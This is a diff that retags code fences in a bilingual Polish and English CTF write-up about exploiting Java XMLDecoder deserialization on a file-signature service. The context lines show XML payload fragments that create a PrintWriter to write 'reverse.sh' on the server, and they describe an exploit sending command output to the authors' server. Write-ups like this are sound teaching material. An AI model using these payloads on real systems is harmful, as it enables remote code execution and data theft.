@@ -10,7 +10,7 @@
 W zadaniu dostępna jest strona, która generuje podpis dla wybranego przez nas pliku, oraz pozwala na weryfikacje takiego podpisu.
 Istotny fakt jest taki, że pliki z podpisem wyglądają tak:
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
  <object class="models.CTFSignature" id="CTFSignature0">
@@ -37,7 +37,7 @@ Występuje tu podatność podobna do Pythonowego Pickle - deserializacja jest w 
 
 Możemy na przykład utworzyć dowolny obiekt używając tagu `<object>` a następnie podając parametry konstruktora, na przykład:
 
-```
+```xml
 <object class = "java.io.PrintWriter">
 	<string>reverse.sh</string>
 </object>
@@ -46,7 +46,7 @@ Wykona `new PrintWriter("reverse.sh");`
 
 Możemy też wykonywać dowolne metody na takim obiekcie za pomocą tagów `<method>` oraz `<void>` i tak na przykład:
 
-```
+```xml
 <object class = "java.io.PrintWriter">
 	<string>reverse.sh</string>
 	<method name = "write">
@@ -68,7 +68,7 @@ tym samym tworząc na serwerze plik z podaną zawartością.
 
 Możemy także nadawać "id" tworzonym obiektom i używać ich jako parametrów dla innych obiektów.
 
-```
+```xml
 <void class="java.lang.String" id="someString">
     <string>some data</string>
 </void>
@@ -83,7 +83,7 @@ Możemy także nadawać "id" tworzonym obiektom i używać ich jako parametrów 
 
 Mając takie możliwości przygotowaliśmy exploita który pozwalał nam na wykonanie dowolnego kodu na zdalnej maszynie, a wynik przekazywał jako parametr GET wysłany po http do naszego serwera:
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
 
@@ -137,7 +137,7 @@ Dzięki temu mogliśmy użyć komendy `find` aby znaleźć plik `flag` a potem w
 In the task there is a webpage which generates a signature for a selected file, and lets us verify the signature.
 It is important to notice that signature files are:
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
  <object class="models.CTFSignature" id="CTFSignature0">
@@ -164,7 +164,7 @@ They have the same type of vulnerability as Python Pickle - deserialization can 
 
 For example we can create any object using `<object>` tag and then pass the constructor arguments to it, eg:
 
-```
+```xml
 <object class = "java.io.PrintWriter">
 	<string>reverse.sh</string>
 </object>
@@ -174,7 +174,7 @@ Will execute `new PrintWriter("reverse.sh");`
 
 We can also call any methods on such objects using `<method>` and `<void>` tags, and therefore:
 
-```
+```xml
 <object class = "java.io.PrintWriter">
 	<string>reverse.sh</string>
 	<method name = "write">
@@ -196,7 +196,7 @@ creating a file on the server with given contents.
 
 We can also assign "id" to the objects and then use them as parameters of other objects:
 
-```
+```xml
 <void class="java.lang.String" id="someString">
     <string>some data</string>
 </void>
@@ -211,7 +211,7 @@ We can also assign "id" to the objects and then use them as parameters of other 
 
 With such capability we created an exploit which lets us execute any code on target machine, and the results are send with http GET request to our server:
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <java version="1.8.0_72-internal" class="java.beans.XMLDecoder">
 
